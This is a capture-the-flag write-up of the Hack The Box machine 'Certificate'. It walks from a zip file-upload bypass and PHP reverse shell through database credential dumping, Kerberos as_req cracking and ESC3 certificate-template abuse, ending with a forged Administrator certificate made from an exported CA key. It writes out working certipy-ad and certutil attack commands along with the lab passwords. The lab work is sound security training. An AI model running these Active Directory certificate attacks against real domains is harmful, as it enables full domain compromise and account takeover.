---
title: 'HTB-Certificate'
published: 2025-07-14
draft: false
toc: true
tags: ['as_req', 'FileUploadAttacks', 'ESC3', 'SeManageVolumePrivilege', 'certipy-ad', 'CertificateForging', 'zip']
---
**Start 17:22 14-07-2025**

---

```
Scope:
10.10.11.71
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- -vvvv -T5 --min-rate=5000 -Pn certificate.htb

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Certificate | Your portal for certification
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-favicon: Unknown favicon MD5: FBA180716B304B231C4029637CCF6481
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-14 23:25:25Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T23:26:54+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T23:26:54+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
|_ssl-date: 2025-07-14T23:26:54+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T23:26:54+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
49713/tcp open  msrpc         syn-ack Microsoft Windows RPC
49722/tcp open  msrpc         syn-ack Microsoft Windows RPC
49748/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50770/tcp): CLEAN (Timeout)
|   Check 2 (port 62565/tcp): CLEAN (Timeout)
|   Check 3 (port 43669/udp): CLEAN (Timeout)
|   Check 4 (port 52308/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-14T23:26:17
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
```

## 80/TCP - HTTP

![](attachments/b6ce4b12f458689c5e8ef54dc57fee84.png)

It's got a variety of pages with forms to test.

I tried sending a subscription mail and viewed the request:

![](attachments/b2746290b107ac68ab1382fd0c24aada.png)

I started testing for `xss`:

![](attachments/5821531601e4555e67e617cfb69f221f.png)

Nothing, I went and copied the request and let `sqlmap` run:

![](attachments/3434c4eece563d331688ee4b3cd64294.png)

In the meantime `gobuster` found an absolute boatload of endpoints:

![](attachments/2c25e1c3a036d2fa8bdde06f300c3d8d.png)

So I went on and tried registering an account:

![](attachments/194a44ac09e353e389c11d53f1fa0c9b.png)

![](attachments/1dee168358e29a63e525c9f81952620a.png)

Apparently *test* already exists? I filled in the same but for *test2*.

![](attachments/051a7f4fd68e4a19716074df73695ea1.png)

I went on and logged in:

![](attachments/00f3a00ead386167664f40d65c038b3f.png)

![](attachments/6dbde0d469eff74e68dfb513e8062728.png)

I clicked on one of the courses in the dashboard which took me here: 

![](attachments/740cf738c2adf3ce12271e2f05afd844.png)

![](attachments/f6ae90e71997826de67a450910113a80.png)

Some courses however don't have an ID yet, simply because they don't exist:

![](attachments/11055c5534778127826da416be0893ed.png)

It appears though that we can upload them:

![](attachments/f978fc877ea491853208ada3639713e7.png)

![](attachments/ce01742141c12768f2f858698088e1c5.png)

I tried uploading a reverse shell:

![](attachments/5a91fd0b4817c1a251e1e1e3692b2795.png)

Guess I'll have to improvise.

# Foothold
## Reverse Shell as xamppuser

![](attachments/18b03dccfb8c3b9bd51193adadefbd37.png)

![](attachments/3fdc102cd4328c3d6a313cacb200de14.png)

![](attachments/869fc892bcc25b432722232512195c51.png)

I click on **HERE** and it takes me to the `not_mal.pdf` file:

![](attachments/dfda58ab1049fc3459cbeabf26423b95.png)

But since I also added the `mal/shell.php` directory inside the `zip`, I can easily access it as follows:

![](attachments/26c6c38d34d131863156e2a696a51089.png)

:::fail
I screwed up with my payload:
![](attachments/abd3964a84d516586596c3e565a0cf98.png)
:::

I used the `ivan` shell:

![](attachments/a650ab1bfaefdaf4e11dea80c6e92a7e.png)

![](attachments/d9e560daa2f3fca49a4a8055ffe6b400.png)

![](attachments/e6ec36c00c463c3c208e221db5a95f42.png)

:::tip
In order to not fuck something up and having to restart a shell, I got a double reverse shell to `penelope`:
![](attachments/035862bde96ed0c52367df1b8607b970.png)
:::

## Enumeration

![](attachments/be3a329b28e77e06d82309bbcea0148e.png)

I went over to the webroot:

![](attachments/b46d80a259ed654ba35fe77e690bfa3a.png)

![](attachments/f31273d10f3a0bc68599805d8013c222.png)

### MySQL

![](attachments/8c4035aaffb16387d85cbfd4ba3af58d.png)

```
certificate_webapp_user
cert!f!c@teDBPWD
```

It appears that `mysql` is open as well:

![](attachments/473f163ae8f7af1c1fc01dd9f874077d.png)

I tried accessing it from kali:

![](attachments/c17a47c36ccf03a357e56e36e6084494.png)

But it just kept on hanging.

Instead I hopped on over to our target, which conveniently had the binary inside the `C:\xampp\mysql\bin` directory:

![](attachments/b37280a06bc61d45a87d795edb85d301.png)

![](attachments/1f719c4d612f6e345ed939bfd601681e.png)

Since it yet again was not interactive I had to issue commands like above.

Luckily enough we can easily guess the correct table that we're looking for.

```bash
.\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e 'use certificate_webapp_db;SELECT * FROM users;'
```

![](attachments/5bacbe5f95cef2408d1fd518b0a00b58.png)

![](attachments/b0911747c9b9f965abdb2e6bb19960e9.png)

*Sara.B* matched so I had to crack her password.

![](attachments/432828cbd362aa086a1fcabcea42cf95.png)

```
Sara.b
Blink182
```

By spraying the creds I found that I had `winrm` access with *Sara.B*:

![](attachments/c87541544ba7063fb38d881e191b0b3d.png)

## Lateral Movement

![](attachments/23eecef31a1284d359c94380328eba82.png)

Now that I had a valid set of creds and a good foothold I could start moving up.

![](attachments/98e11ce0e87d150eddabbdc1b35d4e90.png)

![](attachments/8754f1df284632190786b863c2540d06.png)

![](attachments/f76314304eeb9363299120c2a05c173e.png)

A `.pcap` file? Let's check it out!

![](attachments/c194ae911b9dd1724c2b1df5f2e1beae.png)

## Wireshark

![](attachments/e8bcd036a09071be9938f53c8f156948.png)

I opened up `wireshark` and started analysing:

![](attachments/ac1c045daa3612e4e8d58b1e4f282ba5.png)

We can look for **kerberos** authentication here:

![](attachments/7429f15d66b7d780a592011b6fff9279.png)

While we see parts of it, it is not enough to decipher it:

![](attachments/e264a684749aca10c83bf275eb92514d.png)

![](attachments/7642d0d5b70af2212511c3683be041b6.png)

While the first one looked promising, it happened to be really dated.

Instead I opted for the GitHub one.

![](attachments/f7ba33ec1da2c58d65f8c9e512979a3a.png)

I played around with it and was easily able to retrieve some goodies:

![](attachments/4d21cccd409ae90a2851ce5ad144eb17.png)

### as_req cracking

![](attachments/3d5b379f971e672bf15a016487246b83.png)

Using it we found the following password set:

```
Lion.SK
!QAZ2wsx
```

![](attachments/8d77f0dee066a1585a9a1f83bcccc9d4.png)

## BloodHound

![](attachments/5dc116b330fd456483fecbb36ac7ef28.png)

![](attachments/d2d7c0a82aa7e96ed66de478087eee4b.png)

I notice that I'm part of the **Remote Management Group** so I go ahead and log in:

![](attachments/89ea763a79039408f842e4059ae949ce.png)

### user.txt

![](attachments/6f468d28d17dc1ca0f90dd6f407f5fe4.png)

And of course our privs are dogshit:

![](attachments/6d4068d1663c7c87359eabc62f34c10a.png)

Unfortunately `bloodhound` didn't offer up any other interesting info either.

## ESC3
### Certipy-ad

Using the following command I checked for whatever vulnerabilities this domain might have:

```bash
certipy-ad find -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' -stdout -vulnerable -dc-ip 10.10.11.71
```

![](attachments/5e338014ea5b441eb95baae2bca5e60e.png)

![](attachments/92dde93d4053b630f5c01c645c35b1db.png)

I checked my mindmap and found the next steps:

![](attachments/977ae580eba68e2f85bad75476d2c0e3.png)

I'll be targeting this template:

![](attachments/bbc8b019b9c8a4fa82e888baf2b7323f.png)

The command will thus look as follows:

```bash
certipy-ad req -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' -template 'Delegated-CRA' -dc-ip 10.10.11.71 -target 'DC01.certificate.htb' -ca 'Certificate-LTD-CA'
```

![](attachments/a15d77d532261199f45fd1453d0be8af.png)

Next up we will be targeting *ryan.k*:

```bash
certipy-ad req -u 'Lion.SK@certificate.htb' -p '!QAZ2wsx' -template 'SignedUser' -dc-ip 10.10.11.71 -target 'DC01.certificate.htb' -ca 'Certificate-LTD-CA' -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'
```

![](attachments/3f2891cc7644365b05910ffb32ff99a7.png)

### TGT

```bash
certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
```

![](attachments/aa6253c722754e60e4e500fa34d46a4f.png)

![](attachments/6702373d41a2ec2cd24a165933d579ad.png)

![](attachments/6fee0e4a29a04e411b68c5ad4788f023.png)

# Privilege Escalation
## SeManageVolumePrivilege

Final stretch, this one is actually quite neat, I've already had the pleasure of doing it once before in [[Access#SeManageVolumePrivilege]].

I go ahead and upload [this tool](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public):

![](attachments/7ec71b4b4db60420dceaf2f889afbc72.png)

![](attachments/5bf4fed8f722be8c1363dae1ae5dbb32.png)

:::note
Doing it the `dll` route didn't work, Defender instantly flagged it.
:::

I'll now create a `temp` directory:

![](attachments/c8936792c42fbc0b8536e8833d3a851f.png)

### Exporting Certificate

Now I will have to execute the following to export my certificate:

```powershell
certutil -Store My
```

![](attachments/29dca3fcc2066832408baa661cf49db0.png)

Next up:

```powershell
certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca Certificate-LTD-CA.pfx
```

![](attachments/b422a70ef8bb5e5a9d4f1d28cf7ca826.png)

![](attachments/c7fc8f2c846215501c8788368854fa30.png)

![](attachments/1e126a99cf802c33e53dfd59d0e14066.png)

### Forging Administrator Certificate

Upon download I can now use `certipy-ad` to `forge` a certificate for *Administrator* which I will in turn use to log in and take over their account.

```bash
certipy-ad forge -ca-pfx Certificate-LTD-CA.pfx -upn 'Administrator@certificate.htb' -out admin.pfx
```

![](attachments/afc973870d1480daf724ec6865acf980.png)

### Persistence

I then go ahead and change the password so I can keep my backdoor:

```bash
certipy-ad auth -pfx admin.pfx -username 'Administrator' -dc-ip 10.10.11.71 -domain certificate.htb -ldap-shell
```

![](attachments/497c6434c96c6d41d3c762f9d142359d.png)

### root.txt

![](attachments/e76a87f66ce86e1b86d561cdc1366457.png)

![](attachments/16c372be7681974885194b8479490582.png)

---
